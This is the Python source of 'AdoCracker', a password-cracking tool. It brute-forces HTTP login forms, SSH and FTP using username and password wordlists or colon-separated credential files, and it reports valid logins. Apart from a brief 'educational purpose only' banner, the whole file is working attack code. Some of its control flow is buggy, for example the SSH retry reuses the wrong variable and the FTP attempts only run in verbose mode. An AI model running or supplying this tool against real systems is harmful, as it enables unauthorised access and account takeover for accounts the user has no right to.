import socket
import requests
import sys
from pyfiglet import figlet_format
import argparse
import time
import paramiko
import ftplib
from termcolor import colored

banner = "AdoCracker"
print((colored(figlet_format(banner, font="standard"), color="blue")))
print("\033[1;92m[*] This is a password cracker tool for HTTP, FTP and SSH")
print("\033[1;33m[*] This tool is for educational purpose only \n\033[1;31m[*] Do not use it on systems you are not "
      "authorized to")
print("\033[1;92m[*] Author @adomigold,", "Github account: https://github.com/adomigold/ \n\033[1;37m")

parser = argparse.ArgumentParser()
parser.add_argument('-a', '--attack', type=str, help="Target url or IP address")
parser.add_argument('-l', '--login', type=str, help="Target username")
parser.add_argument('-L', '--login_file', type=str, help="File contain usernames")
parser.add_argument('-C', '--colon_file', help="Colon separated 'login:password' files")
parser.add_argument('-p', '--password', type=str, help="Target Password")
parser.add_argument('-P', '--password_file', type=str, help="File contains passwords")
parser.add_argument('-t', '--threads', type=str, help="Thread connection")
parser.add_argument('-v', '--verbose', nargs='?', help="Enter show to see login attempts")
parser.add_argument('-s', '--service', type=str, help="Acceptable services are http, ftp, ssh and smtp")
parser.add_argument('-r', '--response', type=str, help="Web response after login failed attempt")
parser.add_argument('-o', '--port', type=int, help="SSH, FTP and SMTP ports")
parser.add_argument('--username_form', type=str, help="Username form as shown on site sourcecode")
parser.add_argument('--password_form', type=str, help="Password form as shown on site sourcecode")
args = parser.parse_args()

if len(sys.argv) < 2:
    print("\n\033[1;37mType -h or --help on how to use")
    exit(0)

# Attacking HTTP Service
if args.service == "http":
    try:
        target = args.attack
        username = args.login
        username_file = args.login_file
        colon_file = args.colon_file
        password = args.password
        password_file = args.password_file
        response = args.response
        form1 = args.username_form
        form2 = args.password_form

        if "://" not in target:
            print("Target must start with http:// or https://")
            exit(0)

        # When single password provided
        if args.password in sys.argv:
            print("\033[1;34m------------------------------"
                  "\n     adocracker is started      "
                  "\n  Take a cup of coffee and wait"
                  "\n------------------------------")
            file = open(username_file)
            user_list = file.readlines()

            for user in user_list:
                user = user.rstrip()

                if args.verbose in sys.argv:
                    if args.verbose != "show":
                        break

                    print('\033[1;37m''[+]', user, '-', password)
                post = {f'{form1}': user, f'{form2}': password, 'submit': "Submit"}
                re = requests.post(target, data=post)
                if args.response in re.text:
                    pass
                else:
                    print("\n\033[1;92m-----------------------------------------"
                          "\n Username found:", user,
                          "\n-----------------------------------------")
                    break
            else:
                print("\n\033[1;31m------------------------------------------------------------------"
                      "\n Sorry!! No password or username found on your wordlist"
                      "\n Please provide wordlist with more words to increase your chance"
                      "\n------------------------------------------------------------------")
                exit(0)

        # When colon file is provided
        elif args.colon_file in sys.argv:
            print("\033[1;34m------------------------------"
                  "\n     adocracker is started      "
                  "\n  Take a cup of coffee and wait"
                  "\n------------------------------")
            file = open(colon_file)
            for line in file.readlines():
                if ":" in line:
                    user = line.split(':')[0]
                    pwd = line.split(':')[1]
                    if args.verbose in sys.argv:
                        if args.verbose != "show":
                            break
                        print('\033[1;37m''[+]', user, '-', pwd.strip())
                    post = {f'{form1}': user, f'{form2}': pwd.strip(), 'submit': "Submit"}
                    re = requests.post(target, data=post)
                    if args.response in re.text:
                        pass
                    else:
                        print("\n\033[1;92m-----------------------------------------------------------"
                              "\n Username and Password found:", user, "=>", pwd,
                              "----------------------------------------------------------")
                        break
                else:
                    print("\n\033[1;31m------------------------------------------------------------------"
                          "\n Sorry!! No password or username found on your wordlist"
                          "\n Please provide wordlist with more words to increase your chance"
                          "\n------------------------------------------------------------------")
                    exit(0)

        # When password file provided
        else:
            print("\033[1;34m------------------------------"
                  "\n     adocracker is started      "
                  "\n  Take a cup of coffee and wait"
                  "\n------------------------------")
            file = open(password_file)
            pwd_list = file.readlines()

            for pwd in pwd_list:
                pwd = pwd.rstrip()

                if args.verbose in sys.argv:
                    if args.verbose != "show":
                        break

                    print('\033[1;37m''[+]', username, '-', pwd)
                post = {f'{form1}': username, f'{form2}': pwd, 'submit': "Submit"}
                re = requests.post(target, data=post)
                if args.response in re.text:
                    pass
                else:
                    print("\n\033[1;92m-----------------------------------------"
                          "\n Password found:", pwd,
                          "\n------------------------------------------")
                    break
            else:
                print("\n\033[1;31m------------------------------------------------------------------"
                      "\n Sorry!! No password or username found on your wordlist"
                      "\n Please provide wordlist with more words to increase your chance"
                      "\n------------------------------------------------------------------")
                exit(0)
    except KeyboardInterrupt:
        print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
        exit(0)

# Attacking SSH
elif args.service == "ssh":
    try:
        print("\033[1;34m---------------------------------"
              "\n     adocracker is started      "
              "\n  Take a cup of coffee and wait"
              "\n---------------------------------")

        target = args.attack
        port = args.port
        username = args.login
        username_file = args.login_file
        password = args.password
        password_file = args.password_file
        colon_file = args.colon_file

        # When single password provided
        if args.password in sys.argv:
            file = open(username_file)
            user_list = file.readlines()

            for user in user_list:
                user = user.rstrip()

                def open_ssh(target, port, user, password):
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(target, port, user, password, timeout=600)
                    except socket.timeout:
                        print(f"[!] Host: {target} is unreachable")
                        return False
                    except paramiko.AuthenticationException:
                        if args.verbose in sys.argv:
                            if args.verbose != "show":
                                return False
                            print('\033[1;37m''[+]', user, '-', password)
                        return False
                    except paramiko.ssh_exception.NoValidConnectionsError:
                        print(
                            f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... "
                            f"Press CTRL+c to cancel")
                        time.sleep(10)
                        return open_ssh(target, port, user, password)
                    except paramiko.ssh_exception.SSHException:
                        print(
                            "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't "
                            "know why")
                        exit(0)
                    else:
                        print("\n\033[1;92m-----------------------------------------"
                              "\n Username found:", user,
                              "\n------------------------------------------")
                        exit(0)
                open_ssh(target, port, user, password)
            else:
                print("\n\033[1;31m------------------------------------------------------------------"
                      "\n Sorry!! No password or username found on your wordlist"
                      "\n Please provide wordlist with more words to increase your chance"
                      "\n------------------------------------------------------------------")
                exit(0)

        # When colon_file is provided
        if args.colon_file in sys.argv:
            file = open(colon_file)
            for line in file.readlines():
                if ":" in line:
                    user = line.split(':')[0]
                    pwd = line.split(':')[1]

                    def open_ssh(target, port, user, pwd):
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        try:
                            ssh.connect(target, port, user, pwd.strip(), timeout=600)
                        except socket.timeout:
                            print(f"[!] Host: {target} is unreachable")
                            return False
                        except paramiko.AuthenticationException:
                            if args.verbose in sys.argv:
                                if args.verbose != "show":
                                    return False
                                print('\033[1;37m''[+]', user, '-', pwd.strip())
                            return False
                        except paramiko.ssh_exception.NoValidConnectionsError:
                            print(
                                f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 "
                                f"seconds... Press CTRL+c to cancel")
                            time.sleep(10)
                            return open_ssh(target, port, user, password)
                        except paramiko.ssh_exception.SSHException:
                            print(
                                "\n\033[1;31mConnection was aborted by the software in your host machine... And we "
                                "don't know why")
                            exit(0)
                        else:
                            print("\033[1;92m-----------------------------------------------------------"
                                  "\n Username and Password found:", user, "=>", pwd,
                                  "----------------------------------------------------------")
                            exit(0)
                    open_ssh(target, port, user, pwd)
            else:
                print("\n\033[1;31m------------------------------------------------------------------"
                      "\n Sorry!! No password or username found on your wordlist"
                      "\n Please provide wordlist with more words to increase your chance"
                      "\n------------------------------------------------------------------")
                exit(0)

        # When password file provided
        else:
            file = open(password_file)
            pwd_list = file.readlines()

            for pwd in pwd_list:
                pwd = pwd.rstrip()

                def open_ssh(target, port, username, pwd):
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(target, port, username, pwd, timeout=600)
                    except socket.timeout:
                        print(f"[!] Host: {target} is unreachable")
                        return False
                    except paramiko.AuthenticationException:
                        if args.verbose in sys.argv:
                            if args.verbose != "show":
                                return False
                            print('\033[1;37m''[+]', username, '-', pwd)
                        return False
                    except paramiko.ssh_exception.NoValidConnectionsError:
                        print(
                            f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... "
                            f"Press CTRL+c to cancel")
                        time.sleep(10)
                        return open_ssh(target, port, username, pwd)
                    except paramiko.ssh_exception.SSHException:
                        print(
                            "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't "
                            "know why")
                        exit(0)
                    else:
                        print("\n\033[1;92m-----------------------------------------"
                              "\n Password found:", pwd,
                              "\n------------------------------------------")
                        exit(0)
                open_ssh(target, port, username, pwd)

    except KeyboardInterrupt:
        print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
        exit(0)
    else:
        print("\n\033[1;31m------------------------------------------------------------------"
              "\n Sorry!! No password or username found on your wordlist"
              "\n Please provide wordlist with more words to increase your chance"
              "\n------------------------------------------------------------------")
        exit(0)

# Attacking FTP
elif args.service == "ftp":
    try:
        print("\033[1;34m---------------------------------"
              "\n     adocracker is started      "
              "\n  Take a cup of coffee and wait"
              "\n---------------------------------")

        target = args.attack
        port = args.port
        username = args.login
        username_file = args.login_file
        password = args.password
        password_file = args.password_file
        colon_file = args.colon_file

        # When single password provided
        if args.password in sys.argv:
            file = open(username_file)
            user_list = file.readlines()

            for user in user_list:
                user = user.rstrip()

                def connect_ftp(target, port, user, password):
                    server = ftplib.FTP()
                    if args.verbose in sys.argv:
                        if args.verbose != "show":
                            exit(0)
                        try:
                            server.connect(target, port, timeout=10)
                            server.login(user, password)
                        except ftplib.error_perm:
                            print('\033[1;37m''[+]', user, '-', password)
                            pass
                        except ConnectionRefusedError:
                            print(
                                f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 "
                                f"seconds... "
                                f"Press CTRL+c to cancel")
                            time.sleep(10)
                        else:
                            print("\n\033[1;92m-----------------------------------------"
                                  "\n Username found:", user,
                                  "\n------------------------------------------")
                            exit(0)
                connect_ftp(target, port, user, password)

        # When colon_file is provided
        if args.colon_file in sys.argv:
            file = open(colon_file)
            for line in file.readlines():
                if ":" in line:
                    user = line.split(':')[0]
                    pwd = line.split(':')[1]

                    def connect_ftp(target, port, user, pwd):
                        server = ftplib.FTP()
                        if args.verbose in sys.argv:
                            if args.verbose != "show":
                                exit(0)
                            try:
                                server.connect(target, port, timeout=10)
                                server.login(user, pwd.strip())
                            except ftplib.error_perm:
                                print('\033[1;37m''[+]', user, '-', pwd.strip())
                                pass
                            except ConnectionRefusedError:
                                print(
                                    f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 "
                                    f"seconds... "
                                    f"Press CTRL+c to cancel")
                                time.sleep(10)
                            else:
                                print("\n\033[1;92m-----------------------------------------"
                                      "\n Username and Password found:", user, pwd,
                                      "\n------------------------------------------")
                                exit(0)
                    connect_ftp(target, port, user, pwd)

        # When password file is provided
        else:
            if args.password_file in sys.argv:
                file = open(password_file)
                pwd_list = file.readlines()

                for pwd in pwd_list:
                    pwd = pwd.rstrip()

                    def connect_ftp(target, port, username, pwd):
                        server = ftplib.FTP()
                        if args.verbose in sys.argv:
                            if args.verbose != "show":
                                exit(0)
                            try:
                                server.connect(target, port, timeout=10)
                                server.login(username, pwd)
                            except ftplib.error_perm:
                                print('\033[1;37m''[+]', username, '-', pwd)
                                pass
                            except ConnectionRefusedError:
                                print(
                                    f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 "
                                    f"seconds... "
                                    f"Press CTRL+c to cancel")
                                time.sleep(10)
                            else:
                                print("\n\033[1;92m-----------------------------------------"
                                      "\n Password found:", pwd,
                                      "\n------------------------------------------")
                                exit(0)
                    connect_ftp(target, port, username, pwd)

    except KeyboardInterrupt:
        print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
        exit(0)
    else:
        print("\n\033[1;31m------------------------------------------------------------------"
              "\n Sorry!! No password or username found on your wordlist"
              "\n Please provide wordlist with more words to increase your chance"
              "\n------------------------------------------------------------------")
        exit(0)
elif args.service not in sys.argv:
    print("\n\033[1;31m-------------------------------------------------------"
          "\n Sorry!! Please specify the service target you want to crack"
          "\n You can type -h or --help for how to use this tool"
          "\n--------------------------------------------------------------")
    exit(0)

else:
    print("\n\033[1;31m----------------------------------------------------------------------"
          "\n[+] Sorry!! That service is not implemented now!"
          "\n[+] You are welcome to send a pull request to add more features on our tool"
          "\n-----------------------------------------------------------------------------")
    exit(0)